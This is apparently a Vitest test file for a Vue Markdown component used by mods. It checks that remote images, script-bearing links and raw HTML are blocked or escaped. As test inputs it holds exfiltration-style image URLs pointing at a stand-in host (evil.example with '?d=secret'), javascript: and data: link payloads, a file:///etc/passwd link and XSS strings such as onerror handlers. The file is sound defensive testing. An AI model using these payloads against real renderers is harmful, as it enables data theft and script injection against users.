import { mount } from "@vue/test-utils";
import { describe, expect, it } from "vitest";
import ModMarkdown from "@/components/mods/ModMarkdown.vue";
import { modMarkdownRenderer } from "@/components/mods/mod-markdown";
import { createMarkdownRenderer } from "@/lib/markdown-renderer";
import type { ModWireElement } from "@/lib/mods/types";

const draw = (text: string, props: Record<string, unknown> = {}) =>
  mount(ModMarkdown, { props: { node: { type: "Markdown", props: { text, ...props } } as ModWireElement as never } });

describe("mod Markdown: no network", () => {
  it.each([
    ["remote", "![x](https://evil.example/c?d=secret)"],
    ["http", "![x](http://evil.example/c.png)"],
    ["protocol-relative", "![x](//evil.example/y.png)"],
    ["data svg", "![x](data:image/svg+xml;base64,PHN2Zz4=)"],
    ["data png", "![x](data:image/png;base64,AAAA)"],
    ["relative", "![x](/api/sessions)"],
    ["reference style", "![a][r]\n\n[r]: https://evil.example/c?d=secret"],
    ["collapsed reference", "![a][]\n\n[a]: https://evil.example/c"],
    ["shortcut reference", "![a]\n\n[a]: https://evil.example/c"],
    ["with a title", '![x](https://evil.example/c "t")'],
    ["inside a link", "[![x](https://evil.example/c.png)](https://example.com)"],
    ["in a table", "| a |\n|---|\n| ![x](https://evil.example/c.png) |"],
    ["in a list", "- ![x](https://evil.example/c.png)"],
  ])("draws no image for a %s image", (_name, text) => {
    const view = draw(text);
    expect(view.find("img").exists()).toBe(false);
    expect(view.html()).not.toMatch(/<img|src=|evil\.example|<svg/i);
  });

  it("draws the alt text in place of the image", () => {
    expect(draw("a ![the chart](https://evil.example/c.png) b").text()).toBe("a the chart b");
    expect(draw("![<b>x</b> & y](https://evil.example/c.png)").html()).toContain("&lt;b&gt;x&lt;/b&gt; &amp; y");
  });

  it("still renders the conversation's Markdown otherwise", () => {
    const view = draw("# Title\n\n**bold** and `code`\n\n- one\n- two\n\n```ts\nconst a = 1;\n```");
    expect(view.find("h1").text()).toBe("Title");
    expect(view.find("strong").text()).toBe("bold");
    expect(view.find("code").exists()).toBe(true);
    expect(view.findAll("li")).toHaveLength(2);
    expect(view.find("pre.hljs").exists()).toBe(true);
    expect(view.get(".mod-markdown").classes()).toContain("md-content");
  });

  it("dims on dimColor", () => {
    expect(draw("x", { dimColor: true }).get(".mod-markdown").classes()).toContain("mod-markdown--dim");
    expect(draw("x").get(".mod-markdown").classes()).not.toContain("mod-markdown--dim");
  });

  it("leaves the conversation's renderer alone", () => {
    modMarkdownRenderer();
    expect(createMarkdownRenderer().render("![x](https://example.com/a.png)")).toContain("<img");
    expect(modMarkdownRenderer()).toBe(modMarkdownRenderer());
  });
});

describe("mod Markdown: links", () => {
  it("opens a web link in a new tab without the opener", () => {
    const link = draw("[site](https://example.com/a?b=c) and https://example.org/x").findAll("a");
    expect(link).toHaveLength(2);
    for (const a of link) {
      expect(a.attributes("target")).toBe("_blank");
      expect(a.attributes("rel")).toBe("noopener noreferrer");
    }
    expect(link[0].attributes("href")).toBe("https://example.com/a?b=c");
  });

  it("keeps a mailto link", () => {
    expect(draw("[mail](mailto:a@example.com)").get("a").attributes("href")).toBe("mailto:a@example.com");
  });

  it.each([
    "[a](javascript:alert(1))", "[a](JaVaScRiPt:alert(1))", "[a](  javascript:alert(1))", "[a](java\tscript:alert(1))",
    "[a](vbscript:x)", "[a](data:text/html,<script>alert(1)</script>)", "[a](file:///etc/passwd)",
    "[a](&#106;avascript:alert(1))", "[a](javascript&colon;alert(1))", "<javascript:alert(1)>",
  ])("%s is not a live link", (text) => {
    const view = draw(text);
    expect(view.find("a").exists()).toBe(false);
    expect(view.find("script").exists()).toBe(false);
    expect(view.html()).not.toMatch(/href=/i);
  });

  it.each([
    "<a href='javascript:alert(1)'>x</a>", "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<iframe src='https://evil.example'></iframe>",
  ])("%s is escaped, not HTML", (text) => {
    const view = draw(text);
    expect(view.find("script, img, iframe").exists()).toBe(false);
    expect(view.text()).toContain("<");
  });

  it("draws a file reference, an app path, an anchor and a protocol-relative link as plain text", () => {
    const view = draw("see [x](src/app.ts) and [y](/api/sessions) and [z](#top) and [w](//evil.example/q) and `src/app.ts:3`");
    expect(view.find("a").exists()).toBe(false);
    expect(view.text()).toBe("see x and y and z and w and src/app.ts:3");
  });

  it("keeps the text of a dead link and the live links around it", () => {
    const view = draw("[a](src/a.ts) [b](https://example.com) [c](src/c.ts)");
    expect(view.findAll("a")).toHaveLength(1);
    expect(view.get("a").text()).toBe("b");
    expect(view.text()).toBe("a b c");
  });

  it("does not mark file references even when asked to (no env)", () => {
    expect(draw("`src/app.ts:3` [x](src/app.ts)").find(".file-ref").exists()).toBe(false);
  });
});
